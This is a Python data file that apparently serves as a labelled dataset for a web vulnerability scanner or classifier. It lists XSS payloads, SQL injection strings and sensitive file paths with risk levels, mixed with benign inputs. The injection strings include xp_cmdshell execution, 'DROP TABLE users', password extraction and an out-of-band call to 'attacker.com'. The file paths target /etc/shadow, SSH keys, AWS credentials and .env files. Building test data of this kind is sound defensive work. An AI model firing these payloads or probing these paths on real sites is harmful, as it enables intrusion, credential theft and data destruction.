# XSS Payloads with risk levels
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>,high",
    "<img src='x' onerror='alert(1)'>,high",
    "<svg/onload=alert('XSS')>,high",
    "<body onload=alert(1)>,high",
    "<iframe id=x onblur=alert(1)></iframe><input autofocus>,medium",
    "<input onblur=alert(1) id=x><input autofocus>,medium",
    "<textarea onblur=alert(1) id=x></textarea><input autofocus>,medium",
    "<button onblur=alert(1) id=x></button><input autofocus>,medium",
    "<select onblur=alert(1) id=x></select><input autofocus>,medium",
    "<p><script>/* Bad stuff here... */</script></p>,high",
    "<p>This post was extremely helpful.</p>,low",
    "<script>/* Bad stuff here... */</script>,high",
    "<a autofocus onfocus=alert(1) href></a>,medium",
    "<a autofocus onfocusin=alert(1) href></a>,medium",
    "<a id=x tabindex=1 onfocus=alert(1)></a>,medium",
    "<a id=x tabindex=1 onfocusin=alert(1)></a>,medium",
    "<a onafterscriptexecute=alert(1)><script>1</script>,high",
    "<a onbeforecopy=\"alert(1)\" contenteditable>test</a>,medium",
    "<a onbeforecut=\"alert(1)\" contenteditable>test</a>,medium",
    "<a onbeforescriptexecute=alert(1)><script>1</script>,high",
    "<a onblur=alert(1) id=x tabindex=1 style=display:block>test</a><input value=clickme>,medium",
    "<a onclick=\"alert(1)\" style=display:block>test</a>,medium",
    "<a oncontextmenu=\"alert(1)\" style=display:block>test</a>,medium",
    "<a oncopy=alert(1) value=\"XSS\" autofocus tabindex=1 style=display:block>test,medium",
    "<a oncut=alert(1) value=\"XSS\" autofocus tabindex=1 style=display:block>test,medium",
    "<a ondblclick=\"alert(1)\" autofocus tabindex=1 style=display:block>test</a>,medium",
    "<button oncut=alert(1) value=\"XSS\" autofocus tabindex=1 style=display:block>test,medium",
    "<button ondblclick=\"alert(1)\" autofocus tabindex=1 style=display:block>test</button>,medium",
    "<button onfocusout=alert(1) id=x tabindex=1 style=display:block>test</button><input value=clickme>,medium",
    "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>,high",  
    "<math><mi><mtext><img src=x onerror=alert(1)></mtext></mi></math>,high",
    "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>,high",
    "<details open ontoggle=alert(1)></details>,high",
    "<video><source onerror=\"alert(1)\"></video>,high",
    "<script>document['write']('<img src=x onerror=alert(1)>')</script>,high",
    "<<script>><<alert>(1)//<</script>>,high", 
    "<object data='javascript:alert(1)'></object>,high",
    "<base href='javascript://'><a href='/.' onclick=alert(1)>Click</a>,high",
    "<input type='text' name='username'>,low",
    "<div class='message'>Welcome back!</div>,low",
    "<a href='https://example.com'>Click here</a>,low",
    "<img src='logo.png' alt='Logo'>,low",
    "<strong>This is bold text</strong>,low",
    "<em>Italic text</em>,low",
    "<script>console.log('hello')</script>,low",  
    "<ul><li>Item 1</li><li>Item 2</li></ul>,low",
    "<button type='submit'>Submit</button>,low",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>,high",
    "<iframe src='javascript:alert(1)'></iframe>,high",
    "<link rel='stylesheet' href='javascript:alert(1)'>,high",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,high",
    "<details ontoggle=\"alert(1)\"><summary>Click</summary></details>,high",
    "<script>eval(String.fromCharCode(88,83,83))</script>,high",
    "<img src=x onerror=alert(1)>,high",
    "<img src=x onerror=eval('alert(1)')>,high",
    "<script>eval('alert(1)')</script>,high",
    "<script>window.onload=alert(1)</script>,high",
    "<svg><animate attributeName='x' values='0;10' dur='1s' onbegin='alert(1)'></animate></svg>,high",
    "<object data='data:image/svg+xml,<svg><script>alert(1)</script></svg>' type='image/svg+xml'>,high",
    "<a href='javascript:alert(1)'>Click Here</a>,medium",
    "<iframe src='javascript:alert(1)'></iframe>,high",
    "<audio autoplay><source src='test.mp3' onerror='alert(1)'></audio>,high",
    "<video autoplay><source src='test.mp4' onerror='alert(1)'></video>,high",
    "<button onfocus='alert(1)'>Click Me</button>,medium",
    "<textarea onfocus='alert(1)'></textarea>,medium",
    "<a onmouseover='alert(1)'>Hover Me</a>,medium",
    "<svg onload='alert(1)'></svg>,high",
    "<input type='image' src='x' onerror='alert(1)'>,high",
    "<form onsubmit='alert(1)'><input type='submit'></form>,low"
]




# SQL Injection Payloads with risk levels
SQLI_PAYLOADS = [
    "' OR 1=1 --,high",
    "' UNION SELECT null, null, username, password FROM users --,high",
    "' OR 'a'='a,medium",
    "' OR 'x'='x' --,medium",
    "AND 1,low",
    "AND 0,low",
    "AND true,low",
    "AND false,low",
    "1-false,low",
    "1-true,low",
    "1*56,low",
    "-2,low",
    "1' ORDER BY 1--+,medium",
    "1' ORDER BY 2--+,medium",
    "1' ORDER BY 3--+,medium",
    "1' ORDER BY 1,2--+,medium",
    "1' ORDER BY 1,2,3--+,medium",
    "1' GROUP BY 1,2,--+,medium",
    "1' GROUP BY 1,2,3--+,medium",
    "GROUP BY columnnames having 1=1 --,medium",
    "-1' UNION SELECT 1,2,3--+,high",
    "OR 1=1,medium",
    "OR 1=0,low",
    "OR x=x,low",
    "OR x=y,low",
    "OR 1=1#,medium",
    "OR 1=0#,low",
    "OR x=x#,low",
    "OR x=y#,low",
    "OR 1=1--,medium",
    "OR 1=0--,low",
    "or sleep(5)=,high",
    " or sleep(5)=,high",
    "')) or sleep(5)=,high",
    "')) or sleep(5)=,high",
    "John,low",
    "123456,low",
    "test@example.com,low",
    "password123,low",
    "SELECT * FROM products WHERE id = 5,low",  
    "user_input = 'hello',low",
    "hello123,low",
    "I love pizza!,low",
    "DROP the mic!,low",  
    "This is a test input.,low",
    "'; EXEC xp_cmdshell('dir'); --,high",  
    "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||',high",  
    "'; WAITFOR DELAY '00:00:05'--,high",  
    "' AND (SELECT COUNT(*) FROM users WHERE LENGTH(password)>0)=1 --,high",
    "'||(SELECT password FROM users WHERE username='admin')||',high",
    "' and updatexml(1,concat(0x3a,(SELECT database())),1)--+,high",  
    "' or if(substr((select user()),1,1)='r',sleep(5),0)--,high",
    "'; DROP TABLE users; --,high",
    "'; SELECT pg_sleep(5); --,high",
    "' AND 1=(SELECT COUNT(*) FROM information_schema.tables); --,high",
    "' AND EXISTS (SELECT * FROM users WHERE username='admin' AND password LIKE '%123%') --,high",
    "' AND 1=UTL_INADDR.get_host_address('attacker.com') --,high",
    "'; EXECUTE IMMEDIATE 'SELECT * FROM credit_cards'; --,high",
    "1' OR 'a'='a' LIMIT 1 OFFSET 1 --,high",
    "1' AND LENGTH(database()) > 5 --,high",
    "'; EXEC xp_cmdshell('ping 127.0.0.1'); --,high",
    "' AND (SELECT COUNT(*) FROM users WHERE LENGTH(username)>5)=1 --,high",
    "1' OR 'a'='a' AND (SELECT LENGTH(table_name) FROM information_schema.tables LIMIT 1) > 0 --,high",
    "' OR 1=1 LIMIT 1 --,high",
    "' UNION ALL SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users' --,high",
    "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM users WHERE username='admin')) --,high",
    "' AND sleep(5) --,high",
    "' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE NULL END) --,high",
    "' AND 1 IN (SELECT COUNT(*) FROM users WHERE username='admin') --,medium",
    "1' AND 1=1--,low",
    "' OR 1=1 --,medium",
    "' OR 1=0 --,low",
    "'; DROP TABLE users; --,high",
    "' OR (SELECT user()) --,high",
    "1' AND 'x'='x' --,medium",
    "' OR '1'='1' LIMIT 1 OFFSET 0 --,high",
    "1' OR EXISTS (SELECT * FROM information_schema.tables WHERE table_name='users') --,high"
]



# Sensitive File Paths with risk levels
SENSITIVE_FILES = [
    "/.git/,high",
    "/.env,high",
    "/config.php,high",
    "/wp-config.php,high",
    "/database.yml,high",
    "/admin/,medium",
    "/backup/,medium",
    "/logs/,medium",
    "/.htaccess,high",
    "/.htpasswd,high",
    "/phpinfo.php,high",
    "/.DS_Store,low",
    "/web.config,high",
    "/credentials.json,high",
    "/secrets.json,high",
    "/private_key.pem,high",
    "/devconfig.ini,medium",
    "/test.php,medium",
    "/config.ini,medium",
    "/old_version/,low",
    "/dump.sql,high",
    "/database.sql,high",
    "/backup.sql,high",
    "/public/.git,high",
    "/uploads/testfile.pdf,medium",
    "/home/user/.ssh/id_rsa,high",
    "/etc/passwd,high",
    "/etc/shadow,high",
    "/etc/hostname,medium",
    "/etc/hosts,medium",
    "/.git/refs/heads/master,high",
    "/backup/latest.tar.gz,high",
    "/tmp/testfile.sql,medium",
    "/public_html/.git/,high",
    "/admin/.env,high",
    "/home/user/.aws/credentials,high",
    "/root/.ssh/id_rsa,high",
    "/var/log/auth.log,high",
    "/var/log/apache2/error.log,high",
    "/var/www/html/.git/,high",
    "/var/www/.git/,high",
    "/.gitmodules,high",
    "/etc/mysql/my.cnf,high",
    "/etc/mysql/mysql.conf.d/mysqld.cnf,high",
    "/usr/share/bugtracker/.git/HEAD,high",
    "/.vscode/settings.json,medium",
    "/etc/ssl/private/server.key,high",
    "/tmp/secret.key,high",
    "/config/secrets.yml,high",
    "/etc/ssh/sshd_config,high",
    "/var/backups/database_backup.sql,high",
    "/.bash_history,high",
    "/home/user/.bash_history,medium",
    "/etc/mysql/my.cnf,high",
    "/.terraform/environment.tfvars,high",
    "/var/www/.env,high",
    "/home/user/.docker/config.json,high"
]


